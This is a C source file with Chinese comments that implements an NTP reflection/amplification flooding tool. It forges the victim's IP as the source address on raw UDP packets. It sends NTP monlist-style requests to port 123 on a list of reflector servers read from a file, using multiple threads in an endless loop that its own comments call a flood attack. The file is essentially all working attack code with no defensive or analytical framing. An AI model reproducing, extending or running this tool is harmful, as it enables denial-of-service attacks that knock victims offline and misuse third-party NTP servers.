#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 8192  // 定义最大数据包大小
#define PHI 0x9e3779b9          // 随机数生成器的常量

// 定义全局变量
static unsigned int payloadsize = 8;  // 数据有效载荷大小
static unsigned int xport = 123;      // 目标端口号 NTP服务器
static uint32_t Q[4096];              // 随机数数组
static uint32_t c = 362436;           // 初始化随机数

// 链表结构体，用于存储目标地址
struct list
{
    struct sockaddr_in data;
    struct list *next;
    struct list *prev;
};

struct list *head;  // 链表头指针

// 线程数据结构体
struct thread_data
{
    int thread_id;
    struct list *list_node;
    struct sockaddr_in sin;
};

// 初始化随机数生成器
void init_rand(uint32_t x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

// CMWC 随机数生成函数
uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;

    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

// 计算校验和
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// 设置 IP 头部
void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payloadsize;
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");  // 设置源 IP 地址
}

// 设置 UDP 头部
void setup_udp_header(struct udphdr *udph)
{
    udph->source = htons(5678);  // 设置源端口
    udph->dest = htons(xport);   // 设置目标端口
    udph->check = 0;
    memcpy((void *)udph + sizeof(struct udphdr), "\x17\x00\x03\x2a\x00\x00\x00\x00", payloadsize);
    udph->len = htons(sizeof(struct udphdr) + payloadsize);
}

// 线程函数，用于发送数据包
void *flood(void *par1)
{
    struct thread_data *td = (struct thread_data *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (/*u_int8_t*/ void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin = td->sin;
    struct list *list_node = td->list_node;

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0)
    {
        fprintf(stderr, "Could not open raw socket.\n");  // 打开原始套接字失败
        exit(-1);
    }

    init_rand(time(NULL));  // 初始化随机数生成器
    memset(datagram, 0, MAX_PACKET_SIZE);

    setup_ip_header(iph);  // 设置 IP 头部
    setup_udp_header(udph);  // 设置 UDP 头部

    udph->source = sin.sin_port;  // 设置源端口
    iph->saddr = sin.sin_addr.s_addr;  // 设置源 IP 地址
    iph->daddr = list_node->data.sin_addr.s_addr;  // 设置目标 IP 地址
    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);  // 计算 IP 校验和

    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
    {
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");  // 设置套接字选项失败
        exit(-1);
    }

    int i = 0;
    while (1)
    {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
        list_node = list_node->next;
        iph->daddr = list_node->data.sin_addr.s_addr;  // 更新目标 IP 地址
        iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);  // 重新计算 IP 校验和
        if (i == 5)
        {
            usleep(0);  // 短暂休眠
            i = 0;
        }
        i++;
    }
}

int main(int argc, char *argv[])
{
    if (argc < 4)
    {
        fprintf(stderr, "Invalid parameters!\n");  // 参数无效
        fprintf(stdout, "Usage: %s <target IP> <target port> <reflection file> <throttle> <time (optional)>\n", argv[0]);  // 使用说明
        exit(-1);
    }

    int i = 0;
    head = NULL;
    fprintf(stdout, "Setting up Sockets...\n");  // 设置套接字...

    int max_len = 128;
    char *buffer = (char *)malloc(max_len);
    buffer = memset(buffer, 0x00, max_len);

    int num_threads = atoi(argv[4]);  // 解析线程数量
    FILE *list_fd = fopen(argv[3], "r");  // 打开反射文件列表
    while (fgets(buffer, max_len, list_fd) != NULL)
    {
        if ((buffer[strlen(buffer) - 1] == '\n') ||
            (buffer[strlen(buffer) - 1] == '\r'))
        {
            buffer[strlen(buffer) - 1] = 0x00;  // 移除换行符
            if (head == NULL)
            {
                head = (struct list *)malloc(sizeof(struct list));
                bzero(&head->data, sizeof(head->data));
                head->data.sin_addr.s_addr = inet_addr(buffer);  // 设置目标 IP 地址
                head->next = head;
                head->prev = head;
            }
            else
            {
                struct list *new_node = (struct list *)malloc(sizeof(struct list));
                memset(new_node, 0x00, sizeof(struct list));
                new_node->data.sin_addr.s_addr = inet_addr(buffer);  // 设置目标 IP 地址
                new_node->prev = head;
                new_node->next = head->next;
                head->next = new_node;
            }
            i++;
        }
        else
        {
            continue;
        }
    }

    struct list *current = head->next;
    pthread_t thread[num_threads];  // 线程数组
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[2]));  // 设置目标端口
    sin.sin_addr.s_addr = inet_addr(argv[1]);  // 设置目标 IP 地址

    struct thread_data td[num_threads];  // 线程数据数组
    for (i = 0; i < num_threads; i++)
    {
        td[i].thread_id = i;
        td[i].sin = sin;
        td[i].list_node = current;
        pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);  // 创建线程
    }

    fprintf(stdout, "Starting Flood...\n");  // 开始洪水攻击...
    if (argc > 5)
    {
        sleep(atoi(argv[5]));  // 如果有时间参数，则休眠指定时间后退出
    }
    else
    {
        while (1)
        {
            sleep(1);  // 无限循环
        }
    }

    return 0;
}